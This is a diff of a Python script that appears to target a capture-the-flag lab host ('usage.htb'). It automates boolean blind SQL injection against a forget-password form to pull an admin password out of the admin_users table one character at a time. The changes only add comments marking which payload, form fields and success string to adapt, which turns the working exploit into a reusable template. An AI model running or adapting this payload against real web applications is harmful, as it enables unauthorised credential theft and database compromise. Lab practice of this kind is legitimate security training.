@@ -12,13 +12,13 @@ password=[]
 
 
 print("\n--+--  Starting on blind sql probe  --+--\n")
-
+# CHANGE -> change sqli on line 20 !!!!
 for i in range(1,62):
 	for char_dec in range(32,127):
 		proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 		url="http://usage.htb/forget-password"
 		sqli_payload=f"test@test.com' or ASCII(SUBSTR((SELECT password FROM admin_users LIMIT 1), {i}, 1)) collate utf8mb4_bin = '{char_dec}'-- -"
-		form_data={'_token': 'JoIK085HLwVbX7ym98y9P8GoHxHDtlH5DLploQda','email': sqli_payload}
+		form_data={'_token': 'JoIK085HLwVbX7ym98y9P8GoHxHDtlH5DLploQda','email': sqli_payload} # CHANGE -> based on POST form data
 		headers={
 		    "Host": "usage.htb",
 		    "Upgrade-Insecure-Requests": "1",
@@ -34,7 +34,7 @@ for i in range(1,62):
 			}
 		response=requests.post(url,data=form_data,headers=headers,verify=False,allow_redirects=True)
 		#print(response.text)
-		if('test@test.com' in response.text):
+		if('test@test.com' in response.text): #CHANGE -> based on response text on succesful guess
 			password.append(chr(char_dec))
 			
 			print(f"found {i}-th char: ",chr(char_dec),"ASCII code: ",char_dec)
